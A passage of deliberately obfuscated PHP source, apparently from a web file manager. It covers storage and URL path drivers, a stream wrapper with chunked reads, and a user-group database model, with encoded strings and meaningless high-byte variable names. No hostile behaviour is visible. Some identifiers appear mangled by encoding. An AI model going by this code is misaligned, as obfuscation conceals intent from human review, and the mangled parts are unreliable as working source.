($this->isFolder($à›¥¤Ëä)) { return $this->folderInfo($à›¥¤Ëä); } else { if ($this->isFile($à›¥¤Ëä)) { return $this->fileInfo($à›¥¤Ëä); } } return !1; } public function exist($ş¥ÖªÂ) { return $this->isFile($ş¥ÖªÂ) || $this->isFolder($ş¥ÖªÂ); } public function isFile($şá‰É¹Û) { return !$this->isFolder($şá‰É¹Û) && $this->objectMeta($şá‰É¹Û); } public function isFolder($À‹„ìˆÓ) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][199], $À‹„ìˆÓ); } protected function objectMeta($†À³±ã¯) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][200], $†À³±ã¯); } protected function _objectMeta($ßòòÎ«) { $ïÁ°ì±Ú =& $_SERVER[¥ÙÌÜ¾ê]; if ($ßòòÎ« == $ïÁ°ì±Ú[33] || $ßòòÎ« == $ïÁ°ì±Ú[8]) { return array(); } $˜ ş•óË = $this->ussRequest($ßòòÎ«, $ïÁ°ì±Ú[1418]); if (!$˜ ş•óË[$ïÁ°ì±Ú[1121]]) { return null; } $¤ØŞûâ¿ = isset($˜ ş•óË[$ïÁ°ì±Ú[1123]]) ? $˜ ş•óË[$ïÁ°ì±Ú[1123]] : array(); if (!isset($¤ØŞûâ¿[$ïÁ°ì±Ú[1419]])) { return null; } $’É•˜çÌ = array($ïÁ°ì±Ú[29] => isset($¤ØŞûâ¿[$ïÁ°ì±Ú[1419]]) ? $¤ØŞûâ¿[$ïÁ°ì±Ú[1419]] : null, $ïÁ°ì±Ú[78] => isset($¤ØŞûâ¿[$ïÁ°ì±Ú[1420]]) ? $¤ØŞûâ¿[$ïÁ°ì±Ú[1420]] : null, $ïÁ°ì±Ú[208] => isset($¤ØŞûâ¿[$ïÁ°ì±Ú[1421]]) ? $¤ØŞûâ¿[$ïÁ°ì±Ú[1421]] : null, $ïÁ°ì±Ú[1388] => isset($¤ØŞûâ¿[$ïÁ°ì±Ú[1422]]) ? $¤ØŞûâ¿[$ïÁ°ì±Ú[1422]] : null); $’É•˜çÌ[$ïÁ°ì±Ú[1389]] = isset($¤ØŞûâ¿[$ïÁ°ì±Ú[1423]]) ? strtotime($¤ØŞûâ¿[$ïÁ°ì±Ú[1423]]) : $’É•˜çÌ[$ïÁ°ì±Ú[1388]]; return $’É•˜çÌ; } protected function _isFolder($¹ÅèèÊÉ) { $ü†çÊ‘… =& $_SERVER[¥ÙÌÜ¾ê]; if ($¹ÅèèÊÉ == $ü†çÊ‘…[33] || $¹ÅèèÊÉ == $ü†çÊ‘…[8]) { return !0; } $â´¨€µ = $this->_objectMeta($¹ÅèèÊÉ); return isset($â´¨€µ[$ü†çÊ‘…[29]]) && $â´¨€µ[$ü†çÊ‘…[29]] == $ü†çÊ‘…[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ú¬¿±å– = false) { } public function exist($¹Œïåàã) { $–ÑÅ­îŠ = $this->info($¹Œïåàã); return $–ÑÅ­îŠ[$_SERVER[¥ÙÌÜ¾ê][195]]; } public function isFile($àĞÕé¡¾) { $¿ğüÄŒ« = $this->info($àĞÕé¡¾); return $¿ğüÄŒ«[$_SERVER[¥ÙÌÜ¾ê][195]]; } public function isFolder($·™‰êîò) { return !1; } public function size($æë²•·¼) { $ÕëĞĞ½¹ = $this->info($æë²•·¼); return $ÕëĞĞ½¹[$_SERVER[¥ÙÌÜ¾ê][78]]; } public function info($’ú¼Íï„) { return $this->infoParse($’ú¼Íï„); } public function infoAuth($‘Ü¹”£Ë) { return $this->infoParse($‘Ü¹”£Ë); } public function infoWithChildren($µÓé¬ÇĞ) { return $this->infoParse($µÓé¬ÇĞ); } public function infoFull($ÊÆÒ¢ùË) { return $this->infoParse($ÊÆÒ¢ùË); } private function infoParse($ƒš÷çº¿) { $áš äÍç =& $_SERVER[¥ÙÌÜ¾ê]; $ÑäØãöë = $this->header($ƒš÷çº¿); if (!$ÑäØãöë || !$ÑäØãöë[$áš äÍç[743]]) { return !1; } $‘½ ƒ¥ = _get($ÑäØãöë, $áš äÍç[335], 0); $Õ‹¦™¹Ğ = array($áš äÍç[28] => $ÑäØãöë[$áš äÍç[28]], $áš äÍç[76] => $ƒš÷çº¿, $áš äÍç[29] => $áš äÍç[193], $áš äÍç[78] => intval($‘½ ƒ¥), $áš äÍç[168] => get_path_ext($ÑäØãöë[$áš äÍç[28]]), $áš äÍç[1304] => $‘½ ƒ¥ > 0 && $ÑäØãöë[$áš äÍç[1424]], $áš äÍç[1305] => !1); return $Õ‹¦™¹Ğ; } private function header($—¥„—„Ú) { $±Ç´Èæ =& $_SERVER[¥ÙÌÜ¾ê]; if (isset(self::$_cacheHeader[$—¥„—„Ú])) { return self::$_cacheHeader[$—¥„—„Ú]; } $§Í–¨ÇÈ = isset($GLOBALS[$±Ç´Èæ[1425]]) ? $GLOBALS[$±Ç´Èæ[1425]] : !1; $GLOBALS[$±Ç´Èæ[1425]] = !0; self::$_cacheHeader[$—¥„—„Ú] = url_header($—¥„—„Ú); $GLOBALS[$±Ç´Èæ[1425]] = $§Í–¨ÇÈ; return self::$_cacheHeader[$—¥„—„Ú]; } public function hashSimple($™£Çşô, $ãØšàùâ = false) { $û” ‡æ =& $_SERVER[¥ÙÌÜ¾ê]; $ú¦äÆ¸û = $this->info($™£Çşô); if (!$ú¦äÆ¸û || !$ú¦äÆ¸û[$û” ‡æ[195]]) { return !1; } $œ®€ë—€ = $ú¦äÆ¸û[$û” ‡æ[78]]; $ºñÄ‡üÇ = 200; $ë†øæÇ€ = 50; if ($œ®€ë—€ <= $ºñÄ‡üÇ * $ë†øæÇ€) { return md5($this->fileSubstr($™£Çşô, 0, $œ®€ë—€)) . $œ®€ë—€; } $Ğ¾Æ¹ë = intval($œ®€ë—€ / $ë†øæÇ€); $©½’¾Áş = $û” ‡æ[33]; $ãÛÔğš = timeFloat(); $ĞÛòÈÓ­ = 15; for ($¸“İ×¤Ñ = 0; $¸“İ×¤Ñ < $ë†øæÇ€; $¸“İ×¤Ñ++) { if (timeFloat() - $ãÛÔğš > $ĞÛòÈÓ­) { return !1; } $Ôèñ˜ßø = $this->fileSubstr($™£Çşô, $Ğ¾Æ¹ë * $¸“İ×¤Ñ, $ºñÄ‡üÇ); if (!$Ôèñ˜ßø) { return !1; } $©½’¾Áş .= $Ôèñ˜ßø; } $©½’¾Áş .= $this->fileSubstr($™£Çşô, $œ®€ë—€ - $ºñÄ‡üÇ, $ºñÄ‡üÇ); return md5($©½’¾Áş) . $œ®€ë—€; } public function getContent($¼ŸŒ‘°¼) { return $this->fileSubstr($¼ŸŒ‘°¼); } public function fileSubstr($Â”ƒû, $È“·ÕáÔ = 0, $å¿´Ğ•Õ = -1) { $ÙëÂ°èÍ =& $_SERVER[¥ÙÌÜ¾ê]; $¢ä”œö® = $this->info($Â”ƒû); if (!$¢ä”œö® || !$¢ä”œö®[$ÙëÂ°èÍ[195]] && $¢ä”œö®[$ÙëÂ°èÍ[78]] > 1024 * 1024 * 10) { return !1; } if ($å¿´Ğ•Õ === -1) { $å¿´Ğ•Õ = $¢ä”œö®[$ÙëÂ°èÍ[78]]; } if ($å¿´Ğ•Õ == 0) { return $ÙëÂ°èÍ[33]; } $€ŞØíÓ  = array($ÙëÂ°èÍ[1426] . $È“·ÕáÔ . $ÙëÂ°èÍ[777] . ($È“·ÕáÔ + $å¿´Ğ•Õ - 1)); $­¤İÜÑ° = url_request($Â”ƒû, $ÙëÂ°èÍ[228], !1, $€ŞØíÓ , !1, !1, 1); return $­¤İÜÑ°[$ÙëÂ°èÍ[1123]] ? $­¤İÜÑ°[$ÙëÂ°èÍ[1123]] : $ÙëÂ°èÍ[33]; } public function download($•ÎõÃ½û, $—¿éÉ¡˜) { Downloader::start($•ÎõÃ½û, $—¿éÉ¡˜); return $—¿éÉ¡˜; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($„¥å­»æ, $íªÅãäË = '') { $this->info = $this->info($„¥å­»æ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¥ÙÌÜ¾ê][76]]; $this->pathOpen = $„¥å­»æ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$„¥å­»æ])) { self::$_chunkBuffer[$„¥å­»æ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($›ø«¡Ü£) { $Ç´×‡ŒÊ = $this->fileSubstr($this->pose, $›ø«¡Ü£); $this->pose += strlen($Ç´×‡ŒÊ); return $Ç´×‡ŒÊ; } public function stream_tell() { return $this->pose; } public function stream_seek($˜ÉÈœ³ç, $à©¨£æ) { $ÄÇÛË =& $_SERVER[¥ÙÌÜ¾ê]; if ($à©¨£æ == SEEK_SET) { $this->pose = $˜ÉÈœ³ç; } else { if ($à©¨£æ == SEEK_CUR) { $this->pose += $˜ÉÈœ³ç; } else { if ($à©¨£æ == SEEK_END) { $this->pose = $this->info[$ÄÇÛË[78]] + intval($˜ÉÈœ³ç); } } } if ($˜ÉÈœ³ç < 0) { $this->pose = $this->info[$ÄÇÛË[78]] + $˜ÉÈœ³ç; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¥ÙÌÜ¾ê][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ß¡éëß, $şİáÀù) { $­´‚Äşì =& $_SERVER[¥ÙÌÜ¾ê]; $‡í–“¡Ó = $this->info($ß¡éëß); return array($­´‚Äşì[1427] => 0, $­´‚Äşì[1428] => 0, $­´‚Äşì[12] => 32768 + 511, $­´‚Äşì[1429] => 0, $­´‚Äşì[1430] => 0, $­´‚Äşì[1431] => 0, $­´‚Äşì[1432] => 0, $­´‚Äşì[78] => $‡í–“¡Ó[$­´‚Äşì[78]], $­´‚Äşì[1433] => $‡í–“¡Ó[$­´‚Äşì[1303]], $­´‚Äşì[1389] => $‡í–“¡Ó[$­´‚Äşì[84]], $­´‚Äşì[1388] => $‡í–“¡Ó[$­´‚Äşì[194]], $­´‚Äşì[1434] => 0, $­´‚Äşì[1435] => 0); } static $fileInfo = array(); public function info($§°›º¾Ö) { $èŞƒšØ» = $_SERVER[¥ÙÌÜ¾ê][1436]; if (isset(self::$fileInfo[$§°›º¾Ö])) { return self::$fileInfo[$§°›º¾Ö]; } if (substr($§°›º¾Ö, 0, strlen($èŞƒšØ»)) != $èŞƒšØ») { return !1; } self::$fileInfo[$§°›º¾Ö] = IO::info(substr($§°›º¾Ö, strlen($èŞƒšØ»))); return self::$fileInfo[$§°›º¾Ö]; } public static function read($ŸÁŒÎÄƒ, $©„‡‹æ±, $¹¦¥ƒº) { if (!isset(self::$_fopenCache[$ŸÁŒÎÄƒ])) { $Ş€’èÃÊ = new StreamWrapperIO(); $Ş€’èÃÊ->stream_open($ŸÁŒÎÄƒ); self::$_fopenCache[$ŸÁŒÎÄƒ] = $Ş€’èÃÊ; } $Ş€’èÃÊ = self::$_fopenCache[$ŸÁŒÎÄƒ]; return $Ş€’èÃÊ->fileSubstr($©„‡‹æ±, $¹¦¥ƒº); } public static function _read($êÏÏÔù‹, $è–Ó¦Ç×, $ÑØÖİÇ†) { $ßø‚ü…ì =& $_SERVER[¥ÙÌÜ¾ê]; $›îöÎ¬ = fopen($êÏÏÔù‹, $ßø‚ü…ì[1307]); if (!$›îöÎ¬) { return $ßø‚ü…ì[33]; } $ÄÑÊ®ºÖ = 8192; fseek($›îöÎ¬, $è–Ó¦Ç×, SEEK_SET); $ö¸ò³ó™ = $ßø‚ü…ì[33]; $Ó€ÕéÚê = 0; while ($Ó€ÕéÚê < $ÑØÖİÇ†) { $¿²äÉÇÑ = min($ÄÑÊ®ºÖ, $ÑØÖİÇ† - $Ó€ÕéÚê); $ö¸ò³ó™ .= fread($›îöÎ¬, $¿²äÉÇÑ); $Ó€ÕéÚê += $¿²äÉÇÑ; } fclose($›îöÎ¬); return $ö¸ò³ó™; } public function fileSubstr($ŞïÙ´‰±, $ªÍŸ¤¤‰) { $½´¨¹• =& $_SERVER[¥ÙÌÜ¾ê]; $ö÷ŞÑíâ = $this->info[$½´¨¹•[78]]; $–Ûåéœ¥ = $ŞïÙ´‰±; $Éš©² = $ªÍŸ¤¤‰; if ($ŞïÙ´‰± < 0) { $ŞïÙ´‰± = $ö÷ŞÑíâ + $ŞïÙ´‰±; } if ($ªÍŸ¤¤‰ === !1) { $ªÍŸ¤¤‰ = $ö÷ŞÑíâ - $ŞïÙ´‰±; } if ($ŞïÙ´‰± + $ªÍŸ¤¤‰ > $ö÷ŞÑíâ) { $ªÍŸ¤¤‰ = $ö÷ŞÑíâ - $ŞïÙ´‰±; } if ($ªÍŸ¤¤‰ <= 0) { return $½´¨¹•[33]; } if ($ŞïÙ´‰± < 0 || $ŞïÙ´‰± >= $ö÷ŞÑíâ || $ªÍŸ¤¤‰ <= 0 || $ªÍŸ¤¤‰ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\151\x6c\x65\x52\145\x61\144\x20\x65\162\x72\157\162\41\40\163\164\x61\162\164\75{$ŞïÙ´‰±}\73\154\145\x6e\147\x74\x68\75{$ªÍŸ¤¤‰}\x3b\40\163\151\x7a\x65\75{$ö÷ŞÑíâ}\x3b"); } $®ïÈâ˜Û = 64 * 1024; $Ñè³Ãù =& self::$_chunkBuffer[$this->path]; if (!$Ñè³Ãù) { $Ñè³Ãù = array(); } $ÇÔ¹¬¥ = 0; $îøÇ¡ğ­ = 0; $° àê‰ = $½´¨¹•[33]; foreach ($Ñè³Ãù as $ÇÔ¹¬¥ => $° àê‰) { $ÇÔ¹¬¥ = intval($ÇÔ¹¬¥); $îøÇ¡ğ­ = $ÇÔ¹¬¥ + strlen($° àê‰); if ($ŞïÙ´‰± >= $îøÇ¡ğ­) { continue; } if ($ŞïÙ´‰± >= $ÇÔ¹¬¥ && $ŞïÙ´‰± + $ªÍŸ¤¤‰ <= $îøÇ¡ğ­) { return substr($° àê‰, $ŞïÙ´‰± - $ÇÔ¹¬¥, $ªÍŸ¤¤‰); } break; } if (count($Ñè³Ãù) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($½´¨¹•[1437], $½´¨¹•[1438] . count($Ñè³Ãù) . "\73\163\164\x61\162\164\75{$ŞïÙ´‰±}\x2c\154\145\x6e\147\164\x68\x3d{$ªÍŸ¤¤‰}\x3b\160\157\x73\145\72{$ÇÔ¹¬¥}\176{$îøÇ¡ğ­}"); throw new Exception($½´¨¹•[1439]); } $‡Õ£ÅƒÈ = intval($ŞïÙ´‰± / $®ïÈâ˜Û) * $®ïÈâ˜Û; $×ûƒÜ§ = ceil(($ŞïÙ´‰± + $ªÍŸ¤¤‰) / $®ïÈâ˜Û) * $®ïÈâ˜Û - $‡Õ£ÅƒÈ; $¿øŞ±ó‹ = IO::fileSubstr($this->path, $‡Õ£ÅƒÈ, $×ûƒÜ§); $Ñè³Ãù[$‡Õ£ÅƒÈ . $½´¨¹•[33]] = $¿øŞ±ó‹; ksort($Ñè³Ãù); $ãĞí¢ƒ = substr($¿øŞ±ó‹, $ŞïÙ´‰± - $‡Õ£ÅƒÈ, $ªÍŸ¤¤‰); return $ãĞí¢ƒ; } private function log($³²ÒÃ³Û, $‹ÙáñÂ) { $á¦›¨¤© =& $_SERVER[¥ÙÌÜ¾ê]; $©Š’‰ïË = timeFloat() - $this->timeStart; write_log(sprintf($á¦›¨¤©[1440], $³²ÒÃ³Û, $this->info[$á¦›¨¤©[28]], $©Š’‰ïË, $‹ÙáñÂ), $á¦›¨¤©[1113]); } } goto DÅğë¯§ª; b˜›ˆ¸—¡: class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\x65" => "\147\162\157\165\x70\x5f\x6d\145\164\141", "\x6d\x65\x74\x61\106\151\x65\154\144" => "\x67\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($ª¶€‚Ü) { $¶ª¹©ƒø =& $_SERVER[¥ÙÌÜ¾ê]; return array($¶ª¹©ƒø[1826] => array($ª¶€‚Ü[0], $¶ª¹©ƒø[1827]), $¶ª¹©ƒø[1828] => array($ª¶€‚Ü[0], $¶ª¹©ƒø[1829])); } protected function getInfo($š¶Ÿæö, $ĞôÁ˜‹¤ = false) { $äíá¿¥ = $this->getInfoSimple($š¶Ÿæö); if (!$äíá¿¥) { return !1; } if ($ĞôÁ˜‹¤) { return $this->_listDataApplyItem($äíá¿¥); } return $this->cacheFunctionGet($_SERVER[¥ÙÌÜ¾ê][1830], $š¶Ÿæö); } protected function getInfoSimple($èÑİ×ş, $¹çÌó—ô = false) { $ñƒ‰»Ê =& $_SERVER[¥ÙÌÜ¾ê]; if ($¹çÌó—ô) { $ÔöÉèÍÑ = array($ñƒ‰»Ê[1749] => intval($èÑİ×ş)); $´Ã¶´Ş = $this->where($ÔöÉèÍÑ)->find(); return is_array($´Ã¶´Ş) ? $´Ã¶´Ş : array(); } return $this->cacheFunctionGet($ñƒ‰»Ê[1831], $èÑİ×ş); } protected function groupAdd($¡÷Š¨É) { $€ê“åĞò =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¡÷Š¨É[$€ê“åĞò[492]] && isset($¡÷Š¨É[$€ê“åĞò[1749]]) && $¡÷Š¨É[$€ê“åĞò[1749]] == 1) { if ($Ì„€Úƒì = $this->getInfoSimple($¡÷Š¨É[$€ê“åĞò[1749]], !0)) { return $¡÷Š¨É[$€ê“åĞò[1749]]; } } else { $Ì„€Úƒì = $this->getInfoSimple($¡÷Š¨É[$€ê“åĞò[492]]); if (!$Ì„€Úƒì) { return !1; } } $îè¬Ğ¦ô = $€ê“åĞò[525]; if ($Ì„€Úƒì[$€ê“åĞò[515]]) { $îè¬Ğ¦ô = $Ì„€Úƒì[$€ê“åĞò[515]] . $Ì„€Úƒì[$€ê“åĞò[1749]] . $€ê“åĞò[47]; } $• ¿Èã£ = array($€ê“åĞò[415] => $this->groupNameAuto($¡÷Š¨É[$€ê“åĞò[492]], $¡÷Š¨É[$€ê“åĞò[28]]), $€ê“åĞò[396] => $¡÷Š¨É[$€ê“åĞò[492]], $€ê“åĞò[578] => $îè¬Ğ¦ô, $€ê“åĞò[1832] => $¡÷Š¨É[$€ê“åĞò[1735]], $€ê“åĞò[1833] => 0, $€ê“åĞò[1753] => 0); if (isset($¡÷Š¨É[$€ê“åĞò[1772]])) { $• ¿Èã£[$€ê“åĞò[1772]] = $¡÷Š¨É[$€ê“åĞò[1772]]; } else { $Ç·ã¤æ = $this->max($€ê“åĞò[1772]); if (!$Ç·ã¤æ) { $Ç·ã¤æ = 0; } $• ¿Èã£[$€ê“åĞò[1772]] = $Ç·ã¤æ + 1; } if (!empty($¡÷Š¨É[$€ê“åĞò[1749]])) { $• ¿Èã£[$€ê“åĞò[1749]] = $¡÷Š¨É[$€ê“åĞò[1749]]; } $Ù•ÆèÀí = $this->add($• ¿Èã£); $this->setNamePinyin($Ù•ÆèÀí, $• ¿Èã£[$€ê“åĞò[28]]); if (isset($¡÷Š¨É[$€ê“åĞò[1834]])) { $this->metaSet($Ù•ÆèÀí, array($€ê“åĞò[1834] => $¡÷Š¨É[$€ê“åĞò[1834]], $€ê“åĞò[1835] => $¡÷Š¨É[$€ê“åĞò[1835]])); unset($¡÷Š¨É[$€ê“åĞò[1834]]); unset($¡÷Š¨É[$€ê“åĞò[1835]]); } Model($€ê“åĞò[1253])->groupRootAdd($Ù•ÆèÀí); return $Ù•ÆèÀí; } protected function groupEdit($£ô˜ŞìØ, $²”÷—»ı) { $ï­‹á¦ƒ =& $_SERVER[¥ÙÌÜ¾ê]; $££ü·³‚ = $this->getInfoSimple($£ô˜ŞìØ); if (!$££ü·³‚) { return !1; } if (!empty($²”÷—»ı[$ï­‹á¦ƒ[492]])) { $Å‘¹ŒÆ = $this->getInfoSimple($²”÷—»ı[$ï­‹á¦ƒ[492]]); if (!$Å‘¹ŒÆ) { return !1; } if ($££ü·³‚[$ï­‹á¦ƒ[1749]] == $Å‘¹ŒÆ[$ï­‹á¦ƒ[1749]]) { return !1; } if ($²”÷—»ı[$ï­‹á¦ƒ[492]] != $££ü·³‚[$ï­‹á¦ƒ[492]]) { if ($Å‘¹ŒÆ[$ï­‹á¦ƒ[515]] !== $££ü·³‚[$ï­‹á¦ƒ[515]] && strpos($Å‘¹ŒÆ[$ï­‹á¦ƒ[515]], $££ü·³‚[$ï­‹á¦ƒ[515]] . $££ü·³‚[$ï­‹á¦ƒ[1749]] . $ï­‹á¦ƒ[47]) === 0) { return !1; } $²”÷—»ı[$ï­‹á¦ƒ[578]] = $Å‘¹ŒÆ[$ï­‹á¦ƒ[515]] . $²”÷—»ı[$ï­‹á¦ƒ[492]] . $ï­‹á¦ƒ[47]; $this->_changeChildLevel($££ü·³‚, $Å‘¹ŒÆ); } } if (isset($²”÷—»ı[$ï­‹á¦ƒ[28]])) { $this->setNamePinyin($£ô˜ŞìØ, $²”÷—»ı[$ï­‹á¦ƒ[28]]); } if (isset($²”÷—»ı[$ï­‹á¦ƒ[1834]])) { $this->metaSet($£ô˜ŞìØ, array($ï­‹á¦ƒ[1834] => $²”÷—»ı[$ï­‹á¦ƒ[1834]], $ï­‹á¦ƒ[1835] => $²”÷—»ı[$ï­‹á¦ƒ[1835]])); unset($²”÷—»ı[$ï­‹á¦ƒ[1834]]); unset($²”÷—»ı[$ï­‹á¦ƒ[1835]]); } $this->_clearChildrenCache($££ü·³‚); return $this->where(array($ï­‹á¦ƒ[1836] => $£ô˜ŞìØ))->save($²”÷—»ı); } private function _clearChildrenCache($…×€ Óå) { $šÖûƒ– =& $_SERVER[¥ÙÌÜ¾ê]; $ôñ‡¤Š‚ = array($šÖûƒ–[578] => array($šÖûƒ–[538], $…×€ Óå[$šÖûƒ–[515]] . $…×€ Óå[$šÖûƒ–[1749]] . $šÖûƒ–[539])); $ÄÜµ• = $this->field($šÖûƒ–[1749])->where($ôñ‡¤Š‚)->select(); foreach ($ÄÜµ• as $œ¥€“ç÷) { $this->_clearCache($œ¥€“ç÷[$šÖûƒ–[1749]]); } } private function _clearCache($¾‰ÔÓ¬ù) { $¢¬ÃÆØ =& $_SERVER[¥ÙÌÜ¾ê]; $this->cacheFunctionClear($¢¬ÃÆØ[1830], $¾‰ÔÓ¬ù); $this->cacheFunctionClear($¢¬ÃÆØ[1831], $¾‰ÔÓ¬ù); } private function _changeChildLevel($Ô¸Ÿ„ï†, $˜“˜¢“, $—ë×Šª = false) { $Ù‡çá–› =& $_SERVER[¥ÙÌÜ¾ê]; $ÙÌ°¤Ğ = $Ô¸Ÿ„ï†[$Ù‡çá–›[515]] . $Ô¸Ÿ„ï†[$Ù‡çá–›[1749]] . $Ù‡çá–›[47]; $úôÖ£‹µ = $˜“˜¢“[$Ù‡çá–›[515]] . $˜“˜¢“[$Ù‡çá–›[1749]] . $Ù‡çá–›[47] . $Ô¸Ÿ„ï†[$Ù‡çá–›[1749]] . $Ù‡çá–›[47]; if ($—ë×Šª) { $úôÖ£‹µ = $˜“˜¢“[$Ù‡çá–›[515]] . $˜“˜¢“[$Ù‡çá–›[1749]] . $Ù‡çá–›[47]; } $¿³´É•½ = array($Ù‡çá–›[578] => array($Ù‡çá–›[538], $Ô¸Ÿ„ï†[$Ù‡çá–›[515]] . $Ô¸Ÿ„ï†[$Ù‡çá–›[1749]] . $Ù‡çá–›[539])); $æÛüöàé = array($Ù‡çá–›[578] => array($Ù‡çá–›[587], "\162\145\160\154\x61\143\145\50\160\x61\x72\x65\156\x74\x4c\x65\x76\x65\x6c\54\x27{$ÙÌ°¤Ğ}\x27\54\x27{$úôÖ£‹µ}\x27\51")); $this->_clearChildrenCache($Ô¸Ÿ„ï†); $this->where($¿³´É•½)->data($æÛüöàé)->save(); } public function setNamePinyin($Šö„¸’, $Ş¯Öå›Ò = false) { $›¨ÕËøÓ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$Ş¯Öå›Ò) { $óâ–ÉÀê = $this->getInfoSimple($Šö„¸’); $Ş¯Öå›Ò = $óâ–ÉÀê[$›¨ÕËøÓ[28]]; } if (!Input::check($Ş¯Öå›Ò, $›¨ÕËøÓ[581])) { $this->metaSet($Šö„¸’, $›¨ÕËøÓ[458], null); $this->metaSet($Šö„¸’, $›¨ÕËøÓ[457], null); return; } $àØÇÖôÊ = array($›¨ÕËøÓ[458] => str_replace($›¨ÕËøÓ[50], $›¨ÕËøÓ[33], Pinyin::get($Ş¯Öå›Ò)), $›¨ÕËøÓ[457] => Pinyin::get($Ş¯Öå›Ò, $›¨ÕËøÓ[582])); $this->metaSet($Šö„¸’, $àØÇÖôÊ); } protected function groupStatus($€½Ô ß…, $ö„‡—ÉÎ) { $é¢ï“­ô =& $_SERVER[¥ÙÌÜ¾ê]; $‚úà«ÂÇ = $this->getInfoSimple($€½Ô ß…); if (!$‚úà«ÂÇ) { return !1; } if ($ö„‡—ÉÎ == $é¢ï“­ô[87]) { $–ÈÍ’îº = $this->parentLevelArray($‚úà«ÂÇ[$é¢ï“­ô[515]]); } else { $âõÄæ® = array($é¢ï“­ô[578] => array($é¢ï“­ô[538], $‚úà«ÂÇ[$é¢ï“­ô[515]] . $‚úà«ÂÇ[$é¢ï“­ô[1749]] . $é¢ï“­ô[539])); $–ÈÍ’îº = $this->where($âõÄæ®)->field($é¢ï“­ô[1749])->select(); $–ÈÍ’îº = array_to_keyvalue($–ÈÍ’îº, $é¢ï“­ô[33], $é¢ï“­ô[1749]); } $–ÈÍ’îº[] = $‚úà«ÂÇ[$é¢ï“­ô[1749]]; $Î— ù¨ = array(); foreach ($–ÈÍ’îº as $€½Ô ß…) { $Î— ù¨[] = array($é¢ï“­ô[1749] => $€½Ô ß…, $é¢ï“­ô[93] => $é¢ï“­ô[743], $é¢ï“­ô[372] => $ö„‡—ÉÎ); $this->_clearCache($€½Ô ß…); } return Model($é¢ï“­ô[1837])->addAll($Î— ù¨, array(), !0); } protected function groupRemove($Ú•ÀˆÙ˜) { $£¾¶éŠÔ =& $_SERVER[¥ÙÌÜ¾ê]; $Â»È·‹ = array($£¾¶éŠÔ[1749] => $Ú•ÀˆÙ˜); $•æ»©Ì = $this->where($Â»È·‹)->find(); if (!$•æ»©Ì || $•æ»©Ì[$£¾¶éŠÔ[492]] == 0) { return !1; } $‡Š õŞë = $this->getInfoSimple($•æ»©Ì[$£¾¶éŠÔ[492]]); $this->_changeChildLevel($•æ»©Ì, $‡Š õŞë, !0); $this->where(array($£¾¶éŠÔ[492] => $Ú•ÀˆÙ˜))->save(array($£¾¶éŠÔ[492] => $•æ»©Ì[$£¾¶éŠÔ[492]])); Model($£¾¶éŠÔ[1837])->where($Â»È·‹)->delete(); Model($£¾¶éŠÔ[1838])->where($Â»È·‹)->delete(); Model($£¾¶éŠÔ[825])->groupRootRemove($Ú•ÀˆÙ˜); return $this->where($Â»È·‹)->delete(); } protected function groupSort($î‹ÛÆò‹) { $Ìş±‘ =& $_SERVER[¥ÙÌÜ¾ê]; $ÍÒ†ŒŠş = array(); foreach ($î‹ÛÆò‹ as $ÀÓı ÒÉ => $­¡Õ‰²‡) { $ÍÒ†ŒŠş[] = array($Ìş±‘[1749], $­¡Õ‰²‡, $Ìş±‘[1772], $ÀÓı ÒÉ + 1); } $this->saveAll($ÍÒ†ŒŠş); } public function listData() { $£¥¼ù“Ô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($£¥¼ù“Ô[$_SERVER[¥ÙÌÜ¾ê][367]]); return $£¥¼ù“Ô; } private function _makeOrder($×´Î«Óº = '') { $ëÏÊÜÍ =& $_SERVER[¥ÙÌÜ¾ê]; $ÈÁ·×İì = array($ëÏÊÜÍ[1749], $ëÏÊÜÍ[28], $ëÏÊÜÍ[1737], $ëÏÊÜÍ[194]); $êåßı¾Ø = array($ëÏÊÜÍ[442] => $ëÏÊÜÍ[443], $ëÏÊÜÍ[444] => $ëÏÊÜÍ[445]); $ÒìÊ¢Ø = Input::get($ëÏÊÜÍ[449], $ëÏÊÜÍ[7], $ëÏÊÜÍ[1753], $ÈÁ·×İì); $«ş¬”Úã = Input::get($ëÏÊÜÍ[450], $ëÏÊÜÍ[7], $ëÏÊÜÍ[1839], array($ëÏÊÜÍ[1839], $ëÏÊÜÍ[444])); $«ş¬”Úã = $êåßı¾Ø[$«ş¬”Úã]; $×´Î«Óº = $×´Î«Óº . "{$ÒìÊ¢Ø}\x20{$«ş¬”Úã}\x2c\x20\x67\162\157\165\160\x49\x44\x20\x61\163\143"; return $this->order($×´Î«Óº); } public function listChild($ş‹ßçı) { $©´‡ì¯ç =& $_SERVER[¥ÙÌÜ¾ê]; $¯ù¶Ñ  = $this->where(array($©´‡ì¯ç[492] => $ş‹ßçı))->_makeOrder()->selectPage(200); $this->_listDataApply($¯ù¶Ñ [$©´‡ì¯ç[367]]); return $¯ù¶Ñ ; } public function listByID($¢œÙ–šÒ) { $ê„®‘ç =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¢œÙ–šÒ) { return array(); } $óÏö›· = array($ê„®‘ç[1749] => array($ê„®‘ç[7], $¢œÙ–šÒ)); $ÍÚı‰µ© = $this->where($óÏö›·)->select(); $ÍÚı‰µ© = array_sort_keep($ÍÚı‰µ©, $ê„®‘ç[1749], $¢œÙ–šÒ); $this->_listDataApply($ÍÚı‰µ©); return $ÍÚı‰µ©; } public function listSearch($ö–ñ´ôñ) { $ıÑüè™ =& $_SERVER[¥ÙÌÜ¾ê]; $æûóïó– = 